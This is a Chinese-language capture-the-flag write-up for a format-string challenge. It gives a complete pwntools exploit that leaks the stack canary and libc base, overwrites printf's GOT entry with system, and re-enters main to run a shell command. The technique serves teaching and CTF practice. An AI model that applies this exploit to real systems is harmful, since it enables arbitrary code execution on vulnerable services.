# 简单格式化字符串

## 题目简述

程序对同一个栈缓冲区进行两次输入，并把用户数据直接作为 `printf` 的格式串：

```c
char s[0x60];
memset(s, 0, sizeof(s));

read(0, s, 0x60);
printf(s);

puts("Again?");
read(0, s, 0x80);
printf(s);
```

这里同时存在两种原语：`printf(s)` 可泄露栈数据并通过 `%n` 写内存；第二次 `read` 还会向 `0x60` 字节缓冲区写入 `0x80` 字节，能够覆盖 canary、旧 `rbp` 和返回地址。

## 解题过程

第一次格式化字符串使用 `%19$p` 泄露 canary，使用 `%3$p` 泄露一个位于 libc `read+18` 的返回地址。具体参数序号来自本题栈布局，换编译参数后应重新用 GDB 或格式串探测确认：

```text
%19$p|%3$p
```

第二次输入需要同时完成两件事：

1. 用 `%12$hhn` 和 `%13$hn` 把 `printf@GOT` 的低 3 字节改为 `system`；两者都位于同一份 libc，已有 GOT 指针的高位保持不变。
2. 在偏移 `0x68` 处放回 canary，并把返回地址覆盖为 `main`，让程序再次进入第一次 `printf`。

重新进入 `main` 后，`printf@PLT` 实际会跳到 `system`。此时首次输入 `cat flag`，就等价于调用 `system("cat flag")`。

```python
import re
from pwn import *

context.arch = "amd64"
elf = context.binary = ELF("./pwn", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 10000)
io = remote(HOST, PORT)

# 第一次 printf：泄露 canary 与 libc 返回地址。
io.recvuntil(b"A peculiar feature in C language\n")
io.send(b"%19$p|%3$p")
leak_data = io.recvuntil(b"Again?\n")
match = re.search(rb"(0x[0-9a-fA-F]+)\|(0x[0-9a-fA-F]+)", leak_data)
if match is None:
    raise RuntimeError(f"failed to parse leaks: {leak_data!r}")

canary = int(match.group(1), 16)
libc_return = int(match.group(2), 16)
read_offset = libc.sym.read
libc.address = libc_return - read_offset - 18
system = libc.sym.system

log.info(f"canary = {canary:#x}")
log.info(f"libc base = {libc.address:#x}")
log.info(f"system = {system:#x}")

# 写 system 的低 1 字节到 printf@GOT，随后写接下来的 2 字节。
low_byte = system & 0xFF
next_two = (system >> 8) & 0xFFFF
parts = []
if low_byte:
    parts.append(f"%{low_byte}c")
parts.append("%12$hhn")

delta = (next_two - low_byte) & 0xFFFF
if delta:
    parts.append(f"%{delta}c")
parts.append("%13$hn")

fmt = "".join(parts).encode()
printf_got = elf.got.printf
payload = fmt.ljust(0x30, b"\x00")
payload += p64(printf_got) + p64(printf_got + 1)

# 第二次 read 的栈溢出：恢复 canary，返回 main。
payload = payload.ljust(0x68, b"A")
payload += p64(canary)
payload += p64(elf.bss() + 0x800)
payload += p64(elf.sym.main)
io.send(payload)

# 第二轮的 printf 已被改成 system。
io.recvuntil(b"A peculiar feature in C language\n")
io.send(b"cat flag\x00")
io.interactive()
```

运行时把 `HOST`、`PORT` 替换为当前题目实例；libc 必须使用题目提供的版本。

## 方法总结

这题把格式化字符串与栈溢出串在一起：第一轮负责泄露 canary 和 libc，第二轮负责 GOT 部分覆写并利用溢出重入 `main`，第三次输入触发已经劫持的 `printf`。关键偏移是 `%19$p`、`%3$p`、`%12$...`、`0x68`，都属于具体二进制的栈布局，题解应说明来源，不能当作通用常量。
